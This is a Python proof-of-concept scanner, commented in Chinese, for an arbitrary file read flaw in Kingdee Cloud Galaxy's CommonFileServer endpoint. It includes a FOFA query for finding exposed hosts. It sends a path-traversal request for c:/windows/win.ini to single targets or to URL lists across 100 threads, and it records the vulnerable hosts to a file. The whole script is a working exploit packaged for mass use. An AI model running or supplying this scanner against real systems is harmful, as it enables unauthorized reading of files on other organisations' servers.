# 金蝶云星空 CommonFileserver 存在任意文件读取漏洞
# fofa:app="金蝶云星空-管理中心"

import requests, sys, argparse
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()  

def banner():
    test = """                              _                      
    ____                                      _____ _ _                                    
  / ___|___  _ __ ___  _ __ ___   ___  _ __ |  ___(_) | ___  ___  ___ _ ____   _____ _ __ 
 | |   / _ \| '_ ` _ \| '_ ` _ \ / _ \| '_ \| |_  | | |/ _ \/ __|/ _ \ '__\ \ / / _ \ '__|
 | |__| (_) | | | | | | | | | | | (_) | | | |  _| | | |  __/\__ \  __/ |   \ V /  __/ |   
  \____\___/|_| |_| |_|_| |_| |_|\___/|_| |_|_|   |_|_|\___||___/\___|_|    \_/ \___|_|   
                                                                                                                                     
"""
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description="金蝶云星空 CommonFileserver 存在任意文件读取漏洞")
    parser.add_argument('-u', '--url', dest='url', type=str, help='Please input your link')
    parser.add_argument('-f', '--file', dest='file', type=str, help='Please input your file path')
    args = parser.parse_args() 
    if args.url and not args.file:
        poc(args.url)  
    elif not args.url and args.file:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n', ''))
        mp = Pool(100)  
        mp.map(poc, url_list)  
        mp.close()  
        mp.join()  
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    payload_url = "/CommonFileServer/c:/windows/win.ini"
    url = target + payload_url
    headers = {
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.9'
    }
    try:
        res = requests.get(url=url,headers=headers,timeout=5,verify=False).text
        if 'files' in res:
            print(f'[+]该url:{target}存在任意文件读取漏洞')
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]该url:{target}存在任意文件读取漏洞'+'\n')
        else:
            print(f'[-]该url:{target}不存在任意文件读取漏洞')
    except:
        print(f'[-]该url:{target}存在访问问题，请手动测试')
    

if __name__ == '__main__':
    main()